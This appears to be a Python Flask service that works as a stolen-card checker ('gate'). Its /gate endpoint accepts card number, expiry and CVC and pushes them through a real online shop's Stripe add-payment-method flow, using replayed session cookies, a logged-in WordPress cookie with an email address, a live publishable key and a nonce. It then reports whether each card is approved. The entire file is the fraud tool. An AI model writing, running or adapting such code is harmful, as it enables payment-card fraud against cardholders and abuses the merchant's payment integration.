import requests
import json
import re
from flask import Flask, request, jsonify

# Initialize Flask App
app = Flask(__name__)

def process_payment(card_details):
    """
    This function contains the core logic from your script.
    It takes a dictionary of card details and processes the payment.
    """
    # --- 1. FIRST REQUEST: GET to add-payment-method page ---
    try:
        cookies = {
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
            'sbjs_first_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
            'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F142.0.0.0%20Safari%2F537.36',
            '_ga': 'GA1.1.1002213286.1764349881',
            'fkcart_cart_qty': '0',
            'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
            '__hstc': '221998599.a2e5bd6399608fed327f4b8dc06dec6e.1764349885082.1764349885082.1764349885082.1',
            'hubspotutk': 'a2e5bd6399608fed327f4b8dc06dec6e',
            '__hssrc': '1',
            '__stripe_mid': '79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2',
            '__stripe_sid': 'e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908',
            '_lscache_vary': '685c04f9545210a296c8c6765c584637',
            'wordpress_logged_in_873cb7bce70a624e4e0ff8ed0a33b1c2': 'malcjaviusstorm%40gmail.com%7C1765559560%7CMB5WprqOzaq05IAaAuiRB0aLFF9DTctDk5UsPhfL23y%7C8b291e94851c72fc19204c6e22a69d844c1845b34ca8caeec74cc7fc6575bb1c',
            '_ga_14QKZLEYED': 'GS2.1.s1764349881$o1$g0$t1764349962$j55$l0$h0',
            '_ga_MNDVKEF2BP': 'GS2.1.s1764349881$o1$g1$t1764349966$j56$l0$h0',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F',
            '__hssc': '221998599.2.1764349885082',
        }
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://bentleylanecreations.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }
        requests.get('https://bentleylanecreations.com/my-account/add-payment-method/', cookies=cookies, headers=headers, timeout=30)
    except Exception:
        return {"status": "declined", "response": "Your card was declined."}

    # --- 2. SECOND REQUEST: POST to Stripe to create payment method ---
    try:
        headers2 = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }
        data2 = f'type=card&card[number]={card_details["card_number"]}&card[cvc]={card_details["cvc"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]={card_details["postal_code"]}&billing_details[address][country]={card_details["country"]}&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbentleylanecreations.com&time_on_page=1283073&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a6f8ef0f-8e7d-4cbe-84f3-78167f3de01c&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=55c950db-485d-4bbe-8c83-e79cb9bf493df4dc3f&muid=79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2&sid=e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20'
        response2 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers2, data=data2, timeout=30)
        response2_data = response2.json()
        if 'error' in response2_data or not response2_data.get('id'):
            return {"status": "declined", "response": "Your card was declined."}
        payment_method_id = response2_data.get('id', '')
    except Exception:
        return {"status": "declined", "response": "Your card was declined."}

    # --- 3. THIRD REQUEST: POST to merchant to create setup intent ---
    try:
        cookies3 = {
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
            'sbjs_first_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
            'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            '_ga': 'GA1.1.1002213286.1764349881',
            '__hstc': '221998599.a2e5bd6399608fed327f4b8dc06dec6e.1764349885082.1764349885082.1764349885082.1',
            'hubspotutk': 'a2e5bd6399608fed327f4b8dc06dec6e',
            '__hssrc': '1',
            '__stripe_mid': '79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2',
            '__stripe_sid': 'e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908',
            '_lscache_vary': '685c04f9545210a296c8c6765c584637',
            'wordpress_logged_in_873cb7bce70a624e4e0ff8ed0a33b1c2': 'malcjaviusstorm%40gmail.com%7C1765559560%7CMB5WprqOzaq05IAaAuiRB0aLFF9DTctDk5UsPhfL23y%7C8b291e94851c72fc19204c6e22a69d844c1845b34ca8caeec74cc7fc6575bb1c',
            '_ga_14QKZLEYED': 'GS2.1.s1764349881$o1$g0$t1764349962$j55$l0$h0',
            '_ga_MNDVKEF2BP': 'GS2.1.s1764349881$o1$g1$t1764350425$j60$l0$h0',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F142.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F',
            '__hssc': '221998599.3.1764349885082',
        }
        headers3 = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://bentleylanecreations.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://bentleylanecreations.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params3 = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data3 = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': 'b7a9cb9881',
        }
        response3 = requests.post('https://bentleylanecreations.com/', params=params3, cookies=cookies3, headers=headers3, data=data3, timeout=30)
        response_data = response3.json()
        
        if response_data.get('success') and response_data.get('data', {}).get('status') == 'succeeded':
            return {"status": "approved", "response": "Payment method added successfully"}
        
        setup_intent_id = response_data.get('data', {}).get('id', '')
        client_secret = response_data.get('data', {}).get('client_secret', '')
        
        if not setup_intent_id or not client_secret:
            return {"status": "declined", "response": "Your card was declined."}
    except Exception:
        return {"status": "declined", "response": "Your card was declined."}

    # --- 4. FOURTH REQUEST: POST to Stripe to confirm setup intent ---
    try:
        headers4 = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }
        data4 = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=l1&client_secret={client_secret}'
        response4 = requests.post(f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm', headers=headers4, data=data4, timeout=30)
        response_json = response4.json()
        
        if 'error' in response_json:
            return {"status": "declined", "response": "Your card was declined."}
        else:
            return {"status": "approved", "response": "Payment method added successfully"}
    except Exception:
        return {"status": "declined", "response": "Your card was declined."}


@app.route('/gate')
def gate():
    # Get the card details from the 'stauth' query parameter
    card_details_str = request.args.get('stauth')

    if not card_details_str:
        return jsonify({"status": "declined", "response": "Your card was declined."})

    # Parse the input: card number|exp_month|exp_year|cvc
    parts = card_details_str.split('|')
    if len(parts) < 4:
        return jsonify({"status": "declined", "response": "Your card was declined."})

    card_number = parts[0].replace(' ', '')
    exp_month = parts[1]
    exp_year = parts[2]
    cvc = parts[3]

    # Handle 2-digit year (e.g., '25' -> '2025')
    if len(exp_year) == 2:
        exp_year = '20' + exp_year

    # Hardcoded defaults as requested
    postal_code = "10001"
    country = "US"

    card_details = {
        'card_number': card_number,
        'exp_month': exp_month,
        'exp_year': exp_year,
        'cvc': cvc,
        'postal_code': postal_code,
        'country': country
    }

    # Process the payment and return the result
    result = process_payment(card_details)
    return jsonify(result)


if __name__ == '__main__':
    # Running on 0.0.0.0 makes it accessible from your local network and the internet
    # Use a non-standard port like 8080 if 5000 is blocked
    app.run(host='0.0.0.0', port=8080, debug=True)
